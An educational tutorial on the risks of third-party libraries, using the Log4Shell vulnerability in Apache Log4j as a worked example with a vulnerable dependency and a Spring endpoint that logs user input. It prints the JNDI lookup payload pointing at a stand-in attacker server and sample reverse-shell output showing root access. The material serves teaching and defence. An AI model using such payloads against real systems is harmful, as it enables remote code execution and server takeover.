---
title: Introduction to third party libraries
---

In software development, you will quickly find how often we rely on third-party libraries and frameworks to build products. These dependencies can significantly reduce the time we need, however, while we benefit from reusing code, we are not always aware of the vulnerabilities they might have.

When you work on a project, we should not only be concerned about the time it takes to build it, but also how we can make it secure and reliable. In a competitive market, when there are security issues in your product, this can negatively affect customer expectations and result in serious financial losses.

For example, in 2021, a critical security vulnerability known as Log4Shell was discovered in the Apache Log4j logging library. This library was used in various consumer and enterprise services, websites, and applications. So, when people found out that attackers can execute remote code on affected systems, there was a costly move to patch and mitigate the threat.

## Third-Party Libraries

Developers use third-party libraries because they are easy to install and integrate. With package managers like `npm`, `pip`, or `maven`, it is easy for you to search and install dependencies from centralized repositories.

```bash
# Install a specific package from PyPI using pip
python -m pip install <some-project>
```

When you install a package, you will typically specify the name and version. Many times, if you are joining a project, these packages or dependencies will be listed in a file like `package.json`, `requirements.txt`, or `pom.xml`.

```bash
# Install all dependencies listed in requirements.txt
python -m pip install -r requirements.txt
```

However, third-party libraries can have vulnerabilities like any other code, that attackers can exploit to attack your program. If these are not regularly updated or fixed, this becomes a problem for you as a user of the library.

In the worst case, dependencies you might use can be abandoned. This means there could be a lack of updates and bug fixes, and oftentimes, you might need to find alternatives or maintain the dependency yourself.

## Handle Third-Party Libraries

To prevent vulnerabilities from third-party libraries, we need to manage them effectively. We should start by carefully selecting what dependencies we plan to integrate. For example, choose libraries from reputable sources with active communities and regular updates.

After you install third-party libraries, it is important that you regularly check for updates and security patches. The sooner you can apply bug fixes the less chance attackers can exploit the dependency in your program.

If you find that a library is no longer receiving updates or support, consider replacing it with an actively maintained alternative. In some cases, you might need to fork the library and maintain it yourself, but this should be a last resort because maintenance can become another challenge.

## Real-World Example

Let's revisit the Log4Shell security incident to better understand how a third-party library could be exploited and put your program at risk of an attack.

To review, this was a vulnerability in the widely used Apache Log4j logging library. This vulnerability allowed attackers to execute remote code by including malicious code in places the logging library could have been used.

For example, let's say we installed the dependency for a Java project. To do this, we used maven and specified the vulnerable version at the time.

```xml
<!-- install vulnerable log4j -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-log4j2</artifactId>
    <version>2.6.1</version>
</dependency>
```

This project was a simple API that processed messages received from users. Instead of creating our own logging solution, we used Log4j because it was the standard with many options to customize for our project.

```java
@PostMapping("/process-message")
public String processMessage(@RequestParam("message") String message, Model model) {
    // process the received message (e.g., log it)
    logger.info("Received message: " + message);

    // add the message to the model (for displaying on a result page)
    model.addAttribute("receivedMessage", message);

    // thymeleaf template name for displaying the result
    return "result";
}
```

However, it was discovered that attackers can exploit programs using this library by including malicious code as input to the logging function. This was possible because Log4j included many options for special use cases that treated special characters as instructions instead of normal data to log.

For example, an exploit called Log4Shell used the following input:

```text
${jndi:ldap://attackerserver.com:1389/ExploitPayload}
```

If this input was passed into our API endpoint, then it was possible for attackers to execute any code they wanted. As the exploit is called Log4Shell, the most common goal was to get a reverse shell. This meant attackers could have taken control of the server to perform any action.

```bash
# Reverse shell established
Netcat: Connection from <ip_address>

# Command to print the current working directory
$ pwd
> /home/ec2-user/victim

# Command to print the current user
$ whoami
> root
```

This was a real threat when the Log4j vulnerability was discovered. For example, you might be familiar with the video game Minecraft. At that time, attackers could have joined multiplayer servers and executed programs on the computer of any player, including the hosting server, who was there.

To fix this vulnerability, the maintainers of Log4j quickly released hot patches to reduce the impact of attacks. Developers who depended on Log4j took steps to update their version. However, people realized that even if they did not directly use Log4j, they might have dependencies that did.
